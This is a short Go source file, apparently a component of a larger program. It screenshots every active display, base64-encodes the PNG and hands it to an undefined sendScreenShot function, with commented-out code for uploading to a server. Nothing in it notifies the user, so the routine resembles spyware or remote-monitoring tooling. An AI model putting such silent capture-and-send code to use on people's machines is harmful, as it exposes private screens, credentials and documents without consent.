package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image"
	"image/png"
	"time"

	"github.com/kbinani/screenshot"
)

func captureScreeShot() bool {
	currentTime := time.Now()
	// Capture each displays.
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return false
	}

	var all image.Rectangle = image.Rect(0, 0, 0, 0)
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		all = bounds.Union(all)
	}
	// Capture all desktop region into an image.
	img, err := screenshot.Capture(all.Min.X, all.Min.Y, all.Dx(), all.Dy())
	if err != nil {
		panic(err)
	}

	fileName := fmt.Sprintf("all_%s.png", currentTime.Format("2006_01_02_15_04_05"))

	save(img, fileName)
	//file upload to server
	// path, err := os.Getwd()
	// if err != nil {
	// 	log.Println(err)
	// }

	// filePath := filepath.Join(path, fileName)
	// uploadFile(filePath)
	return true
}

// save *image.RGBA to filePath with PNG format.
func save(img *image.RGBA, filePath string) {
	// filePath = "screenshots/" + filePath
	// file, err := os.Create(filePath)
	// if err != nil {
	// 	panic(err)
	// }
	// defer file.Close()
	// png.Encode(file, img)

	buf := new(bytes.Buffer)
	png.Encode(buf, img)
	base64Byte := buf.Bytes()
	imgBase64Str := base64.StdEncoding.EncodeToString(base64Byte)
	sendScreenShot(imgBase64Str)

}
